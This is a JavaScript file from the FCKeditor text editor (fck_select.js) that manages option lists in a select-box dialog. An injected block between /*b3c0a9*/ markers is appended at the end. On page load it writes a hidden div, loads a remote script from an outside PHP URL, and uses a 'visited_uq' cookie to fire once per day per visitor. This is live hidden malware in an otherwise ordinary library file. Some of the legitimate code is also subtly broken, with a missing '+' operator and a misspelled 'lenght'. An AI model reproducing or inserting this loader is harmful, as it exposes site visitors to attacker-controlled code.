/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fck_select.js
 * 	Scripts for the fck_select.html page.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

function Select( combo )
{
	var iIndex = combo.selectedIndex ;

	oListText.selectedIndex		= iIndex ;
	oListValue.selectedIndex	= iIndex ;

	var oTxtText	= document.getElementById( "txtText" ) ;
	var oTxtValue	= document.getElementById( "txtValue" ) ;

	oTxtText.value	= oListText.value ;
	oTxtValue.value	= oListValue.value ;
}

function Add()
{
	var oTxtText	= document.getElementById( "txtText" ) ;
	var oTxtValue	= document.getElementById( "txtValue" ) ;

	AddComboOption( oListText, oTxtText.value, oTxtText.value ) ;
	AddComboOption( oListValue, oTxtValue.value, oTxtValue.value ) ;

	oListText.selectedIndex = oListText.options.length - 1 ;
	oListValue.selectedIndex = oListValue.options.length - 1 ;

	oTxtText.value	= '' ;
	oTxtValue.value	= '' ;

	oTxtText.focus() ;
}

function Modify()
{
	var iIndex = oListText.selectedIndex ;

	if ( iIndex < 0 ) return ;

	var oTxtText	= document.getElementById( "txtText" ) ;
	var oTxtValue	= document.getElementById( "txtValue" ) ;

	oListText.options[ iIndex ].innerHTML	= oTxtText.value ;
	oListText.options[ iIndex ].value		= oTxtText.value ;

	oListValue.options[ iIndex ].innerHTML	= oTxtValue.value ;
	oListValue.options[ iIndex ].value		= oTxtValue.value ;

	oTxtText.value	= '' ;
	oTxtValue.value	= '' ;

	oTxtText.focus() ;
}

function Move( steps )
{
	ChangeOptionPosition( oListText, steps ) ;
	ChangeOptionPosition( oListValue, steps ) ;
}

function Delete()
{
	RemoveSelectedOptions( oListText ) ;
	RemoveSelectedOptions( oListValue ) ;
}

function SetSelectedValue()
{
	var iIndex = oListValue.selectedIndex ;
	if ( iIndex < 0 ) return ;

	var oTxtValue = document.getElementById( "txtSelValue" ) ;

	oTxtValue.value = oListValue.options[ iIndex ].value ;
}

// Moves the selected option by a number of steps (also negative)
function ChangeOptionPosition( combo, steps )
{
	var iActualIndex = combo.selectedIndex ;

	if ( iActualIndex < 0 )
		return ;

	var iFinalIndex = iActualIndex   steps ;

	if ( iFinalIndex < 0 )
		iFinalIndex = 0 ;

	if ( iFinalIndex > ( combo.options.lenght - 1 ) )
		iFinalIndex = combo.options.lenght - 1 ;

	if ( iActualIndex == iFinalIndex )
		return ;

	var oOption = combo.options[ iActualIndex ] ;
	var sText	= oOption.innerHTML ;
	var sValue	= oOption.value ;

	combo.remove( iActualIndex ) ;

	oOption = AddComboOption( combo, sText, sValue, null, iFinalIndex ) ;

	oOption.selected = true ;
}

// Remove all selected options from a SELECT object
function RemoveSelectedOptions(combo)
{
	// Save the selected index
	var iSelectedIndex = combo.selectedIndex ;

	var oOptions = combo.options ;

	// Remove all selected options
	for ( var i = oOptions.length - 1 ; i >= 0 ; i-- )
	{
		if (oOptions[i].selected) combo.remove(i) ;
	}

	// Reset the selection based on the original selected index
	if ( combo.options.length > 0 )
	{
		if ( iSelectedIndex >= combo.options.length ) iSelectedIndex = combo.options.length - 1 ;
		combo.selectedIndex = iSelectedIndex ;
	}
}

// Add a new option to a SELECT object (combo or list)
function AddComboOption( combo, optionText, optionValue, documentObject, index )
{
	var oOption ;

	if ( documentObject )
		oOption = documentObject.createElement("OPTION") ;
	else
		oOption = document.createElement("OPTION") ;

	if ( index != null )
		combo.options.add( oOption, index ) ;
	else
		combo.options.add( oOption ) ;

	oOption.innerHTML = optionText.length > 0 ? optionText : '&nbsp;' ;
	oOption.value     = optionValue ;

	return oOption ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
